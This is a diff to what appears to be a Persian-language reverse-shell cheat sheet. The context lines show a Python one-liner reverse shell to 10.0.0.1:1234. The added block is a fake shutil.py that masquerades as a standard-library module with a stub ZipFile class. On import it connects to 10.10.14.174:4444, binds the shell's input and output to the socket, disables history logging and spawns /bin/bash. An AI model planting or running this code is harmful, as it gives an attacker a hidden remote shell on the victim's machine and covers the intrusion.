@@ -117,6 +117,36 @@ socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ```
+or 
+
+```text
+create file as shutil.py contains:
+
+import os
+import pty
+import socket
+
+lhost = "10.10.14.174"
+lport = 4444
+
+ZIP_DEFLATED = 0
+
+class ZipFile:
+   def close(*args):
+       return
+   def __init__(self, *args):
+       return
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((lhost, lport))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv("HISTFILE",'/dev/null')
+pty.spawn("/bin/bash")
+s.close()
+```
+
 
 ### زبان Bash
 
